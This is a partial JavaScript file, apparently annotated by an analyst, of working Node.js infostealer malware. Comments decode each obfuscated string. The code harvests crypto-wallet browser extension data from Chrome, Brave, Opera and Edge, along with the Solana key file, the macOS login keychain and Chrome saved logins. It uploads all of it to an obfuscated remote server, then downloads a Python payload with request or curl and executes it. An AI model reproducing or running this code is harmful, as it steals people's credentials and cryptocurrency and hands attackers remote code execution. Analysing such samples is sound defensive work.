Object.prototype.toString,
  Object.defineProperty,
  Object.getOwnPropertyDescriptor;
const t = "base64",
  c = "utf8",
  a = require("fs"),
  r = require("os"),
  e = (a) => ((s1 = a.slice(1)), Buffer.from(s1, t).toString(c));   //base64-utf8 function without first letter
(pt = require('path')),
  (rq = require("request")),
  (cr = require("crypto")),
  (ex = require('child_process')['exec']),
  (hs = r['hostname']()),
  (pl = r['platform']()),
  (hd = r['homedir']()),
  (td = r['tmpdir']()),
  (tp = r['type']());
let l;
const n = (a) => Buffer.from(a, t).toString(c), // base64-utf-8 decording function
  Z = () => {  ////Make API URL
    let t = "MTQ3LjEyNCaHR0cDovLw4yMTIuODk6MTI0NA==  ";
    for (var c = "", a = "", r = "", e = "", l = 0; l < 10; l++)
      (c += t[l]), (a += t[10 + l]), (r += t[20 + l]), (e += t[30 + l]);
    return (c = c + r + e), n(a) + n(c);
  },   
  s = (t) =>   /// HomeDir Return Function. C/admin/user
    t.replace(/^~([a-z]+|\/)/, (t, c) =>
      "/" === c ? hd : `${pt[n("ZGlybmFtZQ")](hd)}/${c}`
    ), 
  h = "VGVhMG00",
  m = "Z2V0",  // 'get'
  $ = "Ly5ucGw", // '/.npl'
  o = "d3JpdGVGaWxlU3luYw",  // 'writeFileSync'
  d = "L2NsaWVudA", // '/client'
  G = n("ZXhpc3RzU3luYw"); //  existsSync
function b(t) { //// File Access Check Function.
  const c = n("YWNjZXNz" + "U3luYw"); // accessSync
  try {
    return a[c](t), !0;  //fs['accessSync'](t), true
  } catch (t) {
    return !1;
  }
} 
const i = n("RGVmYXVsdA"),  // Default
  u = n("UHJvZmlsZQ"),   // Profile
  W = e("aZmlsZW5hbWU"),  //filename
  Y = e("cZm9ybURhdGE"),  // formData
  p = e("adXJs"), // url
  y = e("Zb3B0aW9ucw"),  //options
  w = e("YdmFsdWU"),  // value
  V = n("cmVhZGRpclN5bmM"), // readdirSync
  f = n("c3RhdFN5bmM"), // statSync
  v = (n("aXNEaXJlY3Rvcnk"), n("cG9zdA")),  // isDirectory post
  j = "L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8", // '/Library/Application Support/'
  L = "L0FwcERhdGEv",  // '/AppData/'
  x = "L1VzZXIgRGF0YQ",  // '/User Data'
  F = "R29vZ2xlL0Nocm9tZQ", // 'Google/Chrome'
  R = [
    "TG9jYWwvQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",   // 'Local/BraveSoftware/Brave-Browser'
    "QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",   /// 'BraveSoftware/Brave-Browser'
    "QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",   //  BraveSoftware/Brave-Browser
  ],
  Q = ["TG9jYWwvR29vZ2xlL0Nocm9tZQ", F, "Z29vZ2xlLWNocm9tZQ"],  /// 'Local/Google/Chrome', Google/Chrome, 'google-chrome'
  X = [
    "Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU",  // 'Roaming/Opera Software/Opera Stable'
    "Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE", // 'com.operasoftware.Opera'
    "b3BlcmE",  /// 'opera'  
  ];
let z = "comp";
const J = [
    "bmtiaWhmYmVv",  // 'nkbihfbeo'
    "ZWpiYWxiYWtv",  // 'ejbalbako'
    "Zmhib2hpbWFl",  // 'fhbohimae'
    "aG5mYW5rbm9j",  // 'hnfanknoc'
    "aWJuZWpkZmpt",  // 'ibnejdfjm'
    "YmZuYWVsbW9t",  // 'bfnaelmom'
    "YWVhY2hrbm1l",  // 'aeachknme'
    "aGlmYWZnbWNj",  // 'hifafgmcc'
  ],
  N = [
	"Z2FlYW9laGxlZm5rb2RiZWZncGdrbm4",  // 'gaeaoehlefnkodbefgpgknn'
	"cGxjaGxnaGVjZGFsbWVlZWFqbmltaG0",  // 'plchlghecdalmeeeajnimhm'
	"bGJvaHBqYmJsZGNuZ2NuYXBuZG9kanA",  // 'lbohpjbbldcngcnapndodjp'
	"ZmVvZmJkZGdjaWpubWhuZm5rZG5hYWQ",  // 'feofbddgcijnmhnfnkdnaad'
	"bWtwY25scGVia2xtbmtvZW9paG9mZWM",  // 'mkpcnlpebklmnkoeoihofec'
	"ZWltaGxwbWdqbmpvcGhocGtrb2xqcGE",  // 'eimhlpmgjnjophhpkkoljpa'
	"ZnBoZXBjY2lvbmJvb2hja29ub2VlbWc",  // 'fphepccionboohckonoeemg'
	"ZHBla3Bsb21qamtjZmdvZG5oY2VsbGo",  // 'dpekplomjjkcfgodnhcellj'
  ],
  U = async (t, c, r) => { // Collect neccessary files in system
    let e = t;
    if (!e || "" === e) return [];
    try {
      if (!b(e)) return [];
    } catch (t) {
      return [];
    }
    c || (c = "");
    let l = [];
    const Z = n("TG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdz"),   /// 'Local Extension Settings'
      s = n("Y3JlYXRlUmVhZFN0cmVhbQ"),   // 'createReadStream'
      h = n("LmxkYg"),  // '.ldb'
      m = n("LmxvZw");  // '.log'
    for (let r = 0; r < 200; r++) {
      const $ = `${t}/${0 === r ? i : `${u} ${r}`}/${Z}`;  //i:Default, u: Profile
      for (let t = 0; t < J.length; t++) {
        const Z = n(J[t] + N[t]);
        let o = `${$}/${Z}`;
        if (b(o)) {
          try {
            far = a[V](o); /// Read all files in O directory
          } catch (t) {
            far = [];
          }
          far.forEach(async (t) => {
            e = pt.join(o, t);
            try {
              (e.includes(h) || e.includes(m)) &&  
                l.push({ [w]: a[s](e), [y]: { [W]: `${c}${r}_${Z}_${t}` } }); // file is .ldb or .log, then value: fs[readfilestream](file), options: filename: 0_profile_folderName_file
            } catch (t) {}
          });
        }
      }
    }
    if (r) {
      const t = n("c29sYW5hX2lkLnR4dA");   // 'solana_id.txt'
      if (((e = `${hd}${n("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`), a[G](e)))  // homedir/.config/solana/id.json, fs[existSync](e)
        try {
          l.push({ [w]: a[s](e), [y]: { [W]: t } });
        } catch (t) {}
    }
    return B(l), l;
  },
  B = (t) => {   /// Send all files to Endpoint
    const c = e("YbXVsdGlfZmlsZQ"),  // 'multi_file'
      a = n("L3VwbG9hZHM"),  // '/uploads'
      r = { timestamp: l.toString(), type: h, hid: z, [c]: t }, // h: VGVhMG00, z: comp
      s = Z();  // Endpoint
    try {
      const t = { [p]: `${s}${a}`, [Y]: r };  // { [url]: endpoint/uploads, [formData]: r }
      rq[v](t, (t, c, a) => {});  //  request[([isDirectory, post])](t, 'multi_file', /uploads)
    } catch (t) {}
  },
  q = async (t, c) => {  // Several Directories for many browsers
    try {
      const a = s("~/");
      let r = "";
      (r =
        "d" == pl[0]
          ? `${a}${n(j)}${n(t[1])}` // homeDir/Library/Application Support/{BraveSoftware/Brave-Browser, Google/Chrome, 'com.operasoftware.Opera'}
          : "l" == pl[0]
          ? `${a}${n("Ly5jb25maWcv")}${n(t[2])}` // homeDir/.config/{'BraveSoftware/Brave-Browser', 'google-chrome', 'opera'}
          : `${a}${n(L)}${n(t[0])}${n(x)}`),  /// homeDir/AppData/{'Local/BraveSoftware/Brave-Browser', 'Local/Google/Chrome', ''Roaming/Opera Software/Opera Stable''}
        await U(r, `${c}_`, 0 == c);
    } catch (t) {}
  },
  T = async () => { // Send file for Mac
    let t = [];
    const c = n("TG9naW4gRGF0YQ"),  // 'Login Data'
      r = n("Y3JlYXRlUmVhZFN0cmVhbQ"),  // 'createReadStream'
      e = n("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),   // '/Library/Keychains/login.keychain'
      l = n("bG9na2MtZGI");    // 'logkc-db'
    if (((pa = `${hd}${e}`), a[G](pa))) // homeDir/e, existsSync
      try {
        t.push({ [w]: a[r](pa), [y]: { [W]: l } }); // Read content, push it
      } catch (t) {}
    else if (((pa += "-db"), a[G](pa))) // homeDir/e-db, existSync
      try {
        t.push({ [w]: a[r](pa), [y]: { [W]: l } });
      } catch (t) {}
    try {
      const e = n("Y29weUZpbGU");  // 'copyFile'
      let l = "";
      if (((l = `${hd}${n(j)}${n(F)}`), l && "" !== l && b(l)))  // homeDir/Library/Application Support/Google/Chrome, check Exist
        for (let n = 0; n < 200; n++) {
          const Z = `${l}/${0 === n ? i : `${u} ${n}`}/${c}`;  // l/Default or Profile Num/Login Data 
          try {
            if (!b(Z)) continue;
            const c = `${l}/ld_${n}`;  // l/ld_num
            b(c)
              ? t.push({ [w]: a[r](c), [y]: { [W]: `pld_${n}` } }) // value: content of c, option: { filename: pld_num }
              : a[e](Z, c, (t) => {  // Copy Z to c, then send data
                  let c = [{ [w]: a[r](Z), [y]: { [W]: `pld_${n}` } }];  // value: content of Z, option: {fileName: pld_num}
                  B(c);   // Send c
                });
          } catch (t) {}
        }
    } catch (t) {}
    return B(t), t;
  },
  S = n("cm1TeW5j"),  // 'rmSync'
  g = "XC5weXBccHl0aG9uLmV4ZQ",   // '\\.pyp\\python.exe'
  C = 51476590;
let H = 0;
const k = async (t) => {  // Extract Zip and Delete Zip and recall I()
    const c = `${n("dGFyIC14Zg")} ${t} -C ${hd}`; // tar -xf fileName -C homeDir
    ex(c, (c, r, e) => { // execute tar command and delete zip file.
      if (c) return a[S](t), void (H = 0);  //fs[rmSync](filename)
      a[S](t), I();
    });
  },
  A = () => {  // Download P2.zip file and Extract and recall I()
    const t = n("cDIuemlw"), // 'p2.zip'
      c = `${Z()}${n("L3Bkb3du")}`, // url/pdown
      r = `${td}\\${n("cC56aQ")}`,  // tempDir/p.zi
      e = `${td}\\${t}`;  //  tempDir/p2.zip
    if (H >= C + 6) return;  // init Of H =0, C = 51476590
    const l = n("cmVuYW1lU3luYw"),  // 'renameSync'
      s = n("cmVuYW1l");  // 'rename'
    if (a[G](r))  // check exist of tempDir/p.zi: true
      try {
        var h = a[f](r); //fs[statSync](tempDir/p.zi)
        h.size >= C + 6
          ? ((H = h.size),
            a[s](r, e, (t) => {  // rename tempDir/p.zi to tempDir/p2.zip
              if (t) throw t;
              k(e);  // extract e file and recall I()
            }))
          : (H < h.size ? (H = h.size) : (a[S](r), (H = 0)), E());  // Delete tempDir/p.zi and recall A() after 20s
      } catch (t) {}
    else { //: false
      const t = `${n("Y3VybCAtTG8")} "${r}" "${c}"`;  // curl -Lo tempDir/p.zi url/pdown
      ex(t, (t, c, n) => {  // execute curl command and rename p.zi to p.zip and extract file and recall I()
        if (t) return (H = 0), void E();
        try {
          (H = C + 6), a[l](r, e), k(e);  // rename and extract file and recall I()
        } catch (t) {}
      });
    }
  };
function E() { // recall A() after 20s
  setTimeout(() => {
    A();
  }, 2e4);
}
const I = async () =>  // Execute Python file
await new Promise((t, c) => {
  if ("w" == pl[0]) {
    const t = `${hd}${n(g)}`;  // homeDir\\.pyp\\python.exe
    a[G](`${t}`)  // Check exist of t
      ? (() => {
          const t = Z(), // URL Endpoint
            c = n(d),  // '/client'
            r = n(m),  // 'get'
            e = n(o),  // 'writeFileSync'
            l = n($),  // '/.npl'
            s = `${t}${c}/${h}`, // url/client/VGVhMG00
            G = `${hd}${l}`,     // homeDir/.npl
            b = `"${hd}${n(g)}" "${G}"`; // homeDir\\.pyp\\python.exe homeDir/.npl
          try {
            a[S](G);  // fs[rmSync](homeDir/.npl): Delete files in homeDir/.npl
          } catch (t) {}
          rq[r](s, (t, c, r) => {  // 
            if (!t)
              try {
                a[e](G, r), ex(b, (t, c, a) => {});  // execute .py file using Python
              } catch (t) {}
          });
        })()
      : A();
  } else
    (() => {
      const t = Z(),  //Url Endpoint
        c = n(d), // '/client'
        r = n(o), // 'writeFileSync'
        e = n(m), // 'get'
        l = n($), // '/.npl'
        s = n("cHl0aG9u"),  // 'python'
        G = `${t}${c}/${h}`,  // url/client/VGVhMG00
        b = `${hd}${l}`;  // homeDir/.npl
      let i = `${s}3 "${b}"`; // python3 homeDir/.npl
      rq[e](G, (t, c, e) => { // Download Pyfile and write it and execute using Python3
        t || (a[r](b, e), ex(i, (t, c, a) => {})); 
      });
    })();
});
var M = 0;
const O = async () => {
  try {
    (l = Date.now()),
      await (async () => {
        z = hs;
        try {
          const t = s("~/"); ///HomeDir
          await q(Q, 0),
            await q(R, 1),
            await q(X, 2),
            "w" == pl[0] &&
              ((pa = `${t}${n(L)}${n("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${n(x)}`),
              await U(pa, "3_", !1)),
            "d" == pl[0] && (await T());
        } catch (t) {}
      })(),
      I();
  } catch (t) {}
};
O();
let _ = setInterval(() => {
  (M += 1) < 5 ? O() : clearInterval(_);
}, 6e5);
